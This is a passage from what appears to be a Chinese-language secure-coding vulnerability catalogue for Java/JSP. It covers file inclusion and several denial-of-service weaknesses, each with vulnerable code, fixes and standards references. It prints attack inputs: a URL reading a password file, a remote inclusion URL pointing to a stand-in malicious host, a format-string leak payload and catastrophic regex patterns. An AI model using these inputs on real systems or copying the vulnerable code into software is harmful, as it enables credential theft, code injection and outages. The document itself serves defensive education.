<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[33] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="Dangerous-File-Inclusion"><a href="#Dangerous-File-Inclusion" class="headerlink" title="Dangerous File Inclusion"></a>Dangerous File Inclusion</h4><h5 id="ABSTRACT-263"><a href="#ABSTRACT-263" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果允许未经验证的用户输入控制动态包含在 JSP 中的文件，会导致恶意代码的执行。</p>
<h5 id="EXPLANATION-264"><a href="#EXPLANATION-264" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>许多现代网络编写语言都能够在一个封装的文件内包含附加的源文件，从而使代码可以重用和模块化。这种能力经常用于赋予应用程序标准外观（应用模板），因而，人们可以共享各种功能而不需要借助编译的代码，或将代码分解成较小的更好管理的文件。各个包含文件都会作为主文件的一部分进行解析，并采用相同的方式来执行。当未验证的用户输入控制了所包含文件的路径时，就会发生 File inclusion 漏洞。</p>
<p>例 1：以下代码是 Local File Inclusion 漏洞的示例。示例代码采用了用户指定的模板名称，并将该名称包含在要呈现的 JSP 页面中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;jsp:include page=&quot;&lt;%= (String)request.getParameter(\&quot;template\&quot;)%&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果攻击者为动态包含指令指定一个有效文件，则该文件的内容会传送给将在页面上呈现的 JSP 解释器。</p>
<p>如果攻击者采用这种手段发起攻击，</p>
<p><code>specialpage.jsp?template=/WEB-INF/database/passwordDB</code></p>
<p>JSP 解释器就会将 <code>/WEB-INF/database/passwordDB</code> 文件的内容在 JSP 页面上呈现，从而对系统安全造成威胁。</p>
<p>更为糟糕的是，如果攻击者可以指定一条路径来指向被自己控制的远程站点，那么动态 include 指令就会执行由攻击者提供的任意恶意代码。</p>
<p>例 2：以下是 Remote File Inclusion 漏洞的示例。示例代码使用 c:import 标签将用户指定的远程文件导入当前的 JSP 页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;c:import url=&quot;&lt;%= request.getParameter(&quot;privacy&quot;)%&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这种攻击手段</p>
<p><code>policy.jsp?privacy=http://www.malicioushost.com/attackdata.js</code></p>
<p>可从被攻击者控制的远程站点将恶意代码注入当前 JSP 页面。</p>
<h5 id="RECOMMENDATIONS-263"><a href="#RECOMMENDATIONS-263" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要允许未验证的用户输入控制动态包含指令中使用的路径。而应当采取一种间接手段：创建一份合法包含文件列表，仅允许用户从该列表中进行选择。利用这种方法，用户就不能直接从 file system 中指定某一个文件。</p>
<h5 id="REFERENCES-262"><a href="#REFERENCES-262" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 94, CWE ID 98, CWE ID 494</p>
<p>[3] Standards Mapping - FIPS200 SI</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-18 Mobile Code (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A3 Malicious File Execution</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A1 Injection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A1 Injection</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.3</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.8</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.8</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Risky Resource Management - CWE ID 094</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 098</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 829</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3600 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3600 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3600 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3600 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3600 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3600 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3600 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-003300 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-003300 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-003300 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium Version 2.00 Remote File Inclusion (RFI) (WASC-05)</p>
<h4 id="Denial-of-Service"><a href="#Denial-of-Service" class="headerlink" title="Denial of Service"></a>Denial of Service</h4><h5 id="ABSTRACT-264"><a href="#ABSTRACT-264" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>攻击者可以造成程序崩溃或使合法用户无法进行使用。</p>
<h5 id="EXPLANATION-265"><a href="#EXPLANATION-265" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>攻击者可能通过对应用程序发送大量请求，而使它拒绝对合法用户的服务，但是这种攻击形式经常会在网络层就被排除掉了。更加严重的是那些只需要使用少量请求就可以使得攻击者让应用程序过载的 bug。这种 bug 允许攻击者去指定请求使用系统资源的数量，或者是持续使用这些系统资源的时间。</p>
<p>示例 1：通过以下代码，用户可以指定线程处于休眠状态的时长。通过指定一个较大的数值，攻击者可以无限期地占用该线程。因此，只需少量的请求，攻击者就能耗尽应用程序的线程池。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int usrSleepTime = Integer.parseInt(usrInput);</span><br><span class="line"></span><br><span class="line">Thread.sleep(usrSleepTime);</span><br></pre></td></tr></table></figure>
<p>示例 2：以下代码从一个 zip 文件中读取字符串。因为它使用 readLine() 方法，所以可以读取一批极大量的输入。攻击者能够利用该代码引发一个 OutOfMemoryException 异常，或者消耗大量的内存，从而致使程序需要更多的时间去执行垃圾信息的收集，或在随后的操作过程中用完内存资源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">InputStream zipInput = zipFile.getInputStream(zipEntry);</span><br><span class="line"></span><br><span class="line">Reader zipReader = new InputStreamReader(zipInput);</span><br><span class="line"></span><br><span class="line">BufferedReader br = new BufferedReader(zipReader);</span><br><span class="line"></span><br><span class="line">String line = br.readLine();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-264"><a href="#RECOMMENDATIONS-264" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>校验用户输入以确保它不会引起不适当的资源利用。</p>
<p>例 3：以下代码允许用户指定线程进入休眠的时间，如例 1 所述，但仅当数值在合理的范围之内时才会有效。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  int usrSleepTime = Integer.parseInt(usrInput);</span><br><span class="line"></span><br><span class="line">  if (usrSleepTime &gt;= SLEEP_MIN &amp;&amp;</span><br><span class="line"></span><br><span class="line">      usrSleepTime &lt;= SLEEP_MAX) &#123;</span><br><span class="line"></span><br><span class="line">    Thread.sleep(usrSleepTime);</span><br><span class="line"></span><br><span class="line">  &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    throw new Exception(&quot;Invalid sleep duration&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 4：以下代码从一个 zip 文件中读取字符串，如例 2 所述，但它读取的最大字符串长度为 MAX_STR_LEN 字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">InputStream zipInput = zipFile.getInputStream(zipEntry);</span><br><span class="line"></span><br><span class="line">Reader zipReader = new InputStreamReader(zipInput);</span><br><span class="line"></span><br><span class="line">BufferedReader br = new BufferedReader(zipReader);</span><br><span class="line"></span><br><span class="line">StringBuffer sb = new StringBuffer();</span><br><span class="line"></span><br><span class="line">int intC;</span><br><span class="line"></span><br><span class="line">while ((intC = br.read()) != -1) &#123;</span><br><span class="line"></span><br><span class="line">  char c = (char) intC;</span><br><span class="line"></span><br><span class="line">  if (c == &apos;\n&apos;) &#123;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (sb.length() &gt;= MAX_STR_LEN) &#123;</span><br><span class="line"></span><br><span class="line">    throw new Exception(&quot;input too long&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sb.append(c);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String line = sb.toString();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-263"><a href="#REFERENCES-263" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] DOS-1: Beware of activities that may use disproportionate resources Oracle</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[4] Standards Mapping - MISRA C++ 2008 Rule 0-3-1</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[19] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Denial-of-Service-Format-String"><a href="#Denial-of-Service-Format-String" class="headerlink" title="Denial of Service: Format String"></a>Denial of Service: Format String</h4><h5 id="ABSTRACT-265"><a href="#ABSTRACT-265" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果允许用户输入控制格式参数，则攻击者能够借此造成异常抛出或信息泄露。</p>
<h5 id="EXPLANATION-266"><a href="#EXPLANATION-266" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>攻击者可以修改格式字符串参数，以造成异常抛出。如果未能捕获此异常，则可能导致应用程序崩溃。或者，如果其他参数中使用了敏感信息，攻击者可能会更改格式字符串以泄露此信息。</p>
<p>示例 1：用户可通过以下代码指定 Formatter.format() 的格式字符串参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Formatter formatter = new Formatter(Locale.US);</span><br><span class="line"></span><br><span class="line">String format = &quot;The customer: %s %s has the balance %4$.&quot; + userInput + &quot;f&quot;;</span><br><span class="line"></span><br><span class="line">formatter.format(format, firstName, lastName, accountNo, balance);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>此程序的最初设计旨在让用户指定所显示余额的小数点。但在现实情况中，对此并没有限制。如果用户可以指定所有内容，则可能会导致抛出如 java.util.MissingFormatArgumentException 等异常。此外，由于它不在 try 块中，因此可能会造成应用程序故障。 针对此示例，更严重的情况是：如果攻击者可以指定用户输入 “2f %3$s %4$.2”，则格式字符串可能会是 “The customer: %s %s has the balance %4$.2f %3$s %4$.2”。这可能会导致敏感的 accountNo 包含在生成的字符串中。</p>
<h5 id="RECOMMENDATIONS-265"><a href="#RECOMMENDATIONS-265" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不管什么时候，只要可以，请将静态的 format string 传递到那些接受 format string 参数的函数。如果必须动态构造 format string，则可定义一组有效的 format string，并从这组安全的 format string 进行选择。最后，请始终要进行如下校验：在所选 format string 中的格式化指示的数量符合即将进行格式化的参数的数量。</p>
<h5 id="REFERENCES-264"><a href="#REFERENCES-264" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] IDS06-J. Exclude unsanitized user input from format strings CERT</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A9 Using Components with Known Vulnerabilities</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Denial-of-Service-Parse-Double"><a href="#Denial-of-Service-Parse-Double" class="headerlink" title="Denial of Service: Parse Double"></a>Denial of Service: Parse Double</h4><h5 id="ABSTRACT-266"><a href="#ABSTRACT-266" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序会调用解析 double 类型的方法，这会导致线程被挂起。</p>
<h5 id="EXPLANATION-267"><a href="#EXPLANATION-267" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在实施 java.lang.Double.parseDouble() 及相关方法时出现漏洞，会导致在解析 [2^(-1022) - 2^(-1075) : 2^(-1022) - 2^(-1076)] 范围内的任意数字时挂起线程。此缺陷可被攻击者用于执行拒绝服务 (DoS) 攻击。 示例：即使程序未直接使用 double 类型，也容易受到攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected void processLocale(HttpServletRequest request, HttpServletResponse response)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        Locale locale = request.getLocale();</span><br><span class="line"></span><br><span class="line">        if (locale != null)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">                session.setAttribute(Globals.LOCALE_KEY, locale);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 Apache Tomcat 中实现 HttpServletRequest 时使用 parseDouble 验证“接受语言”标题的区域设置，会导致对 getLocale() 的任何调用都具有危险性。</p>
<p>该漏洞在 Java 版本 6 Update 23 及更早版本中存在。Java 版本 6 Update 24 或更高版本不存在该漏洞。</p>
<h5 id="RECOMMENDATIONS-266"><a href="#RECOMMENDATIONS-266" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，请应用由 Oracle 发布的修补程序。尽可能为类似 Apache Tomcat 的易受攻击的其他产品安装修补程序。如果不可能，请务必将您的 Fortify Real-Time Analyzer（Fortify 实时分析器）安装配置为防范此攻击。如果您的程序中具有易受攻击的方法调用，可以使用 Double 来避免遭受这种攻击。但这种方法无法保证能够消除此问题。对于类似 BigInteger 的其他数字类，可使用 parseDouble() 方法实现这些类。</p>
<h5 id="REFERENCES-265"><a href="#REFERENCES-265" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Rick Regan Java Hangs When Converting 2.2250738585072012e-308</p>
<p>[2] Oracle Security Alert for CVE-2010-4476</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[7] Standards Mapping - OWASP Top 10 2013 A9 Using Components with Known Vulnerabilities</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Denial-of-Service-Regular-Expression"><a href="#Denial-of-Service-Regular-Expression" class="headerlink" title="Denial of Service: Regular Expression"></a>Denial of Service: Regular Expression</h4><h5 id="ABSTRACT-267"><a href="#ABSTRACT-267" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不可信赖数据被传递至应用程序并作为正则表达式使用。这会导致线程过度使用 CPU 资源。</p>
<h5 id="EXPLANATION-268"><a href="#EXPLANATION-268" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>实施正则表达式评估程序及相关方法时存在漏洞，该漏洞会导致评估线程在处理嵌套和重复的正则表达式组的重复和交替重叠时挂起。此缺陷可被攻击者用于执行拒绝服务 (DoS) 攻击。 示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(e+)+</span><br><span class="line"></span><br><span class="line">([a-zA-Z]+)*</span><br><span class="line"></span><br><span class="line">(e|ee)+</span><br></pre></td></tr></table></figure>
<p>已知的正则表达式实现方法均无法避免这种攻击。所有平台和语言都容易受到这种攻击。</p>
<h5 id="RECOMMENDATIONS-267"><a href="#RECOMMENDATIONS-267" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要将不可信赖的数据用作正则表达式。</p>
<h5 id="REFERENCES-266"><a href="#REFERENCES-266" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Bryan Sullivan Regular Expression Denial of Service Attacks and Defenses</p>
<p>[2] IDS08-J. Sanitize untrusted data included in a regular expression CERT</p>
<p>[3] DOS-1: Beware of activities that may use disproportionate resources Oracle</p>
<p>[4] INPUT-1: Validate inputs Oracle</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 185, CWE ID 730</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[23] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Denial-of-Service-StringBuilder"><a href="#Denial-of-Service-StringBuilder" class="headerlink" title="Denial of Service: StringBuilder"></a>Denial of Service: StringBuilder</h4><h5 id="ABSTRACT-268"><a href="#ABSTRACT-268" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将不受信任的数据附加到使用默认支持数组大小进行初始化的 StringBuilder 实例会导致 JVM 过度使用堆内存空间。</p>
<h5 id="EXPLANATION-269"><a href="#EXPLANATION-269" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>将用户控制的数据附加到使用默认支持字符数组大小 (16) 进行初始化的 StringBuilder 实例，会导致应用程序在调整基础数组的大小以适应用户数据时占用大量堆内存。每次新数据附加到 StringBuilder 实例时，它都会尝试使数据适应其支持字符数组。如果数据不合适，将会创建新的数组，大小为之前的两倍，而旧数组在进行回收之前，将继续留在堆中。此缺陷可被攻击者用于执行拒绝服务 (DoS) 攻击。</p>
<p>示例 1：用户控制的数据附加到使用默认构造函数进行初始化的 StringBuilder 实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">StringBuilder sb = new StringBuilder();</span><br><span class="line"></span><br><span class="line">sb.append(request.getParameter(&quot;foo&quot;));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-268"><a href="#RECOMMENDATIONS-268" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用大小与预期数据的长度相当的数组初始化 StringBuilder，以减少调整支持数组大小的次数。在将数据附加到 StringBuilder 实例前，检查数据大小。</p>
<p>示例 2：用户控制的数据附加到使用默认构造函数进行初始化的 StringBuilder 实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">private final int MAX_DATA = 128;</span><br><span class="line"></span><br><span class="line">private final int EXPECTED_BUFFER_DATA = 1024;</span><br><span class="line"></span><br><span class="line">StringBuilder sb = new StringBuilder(EXPECTED_BUFFER_DATA);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">String data = request.getParameter(&quot;foo&quot;);</span><br><span class="line"></span><br><span class="line">if (data.length() &lt; 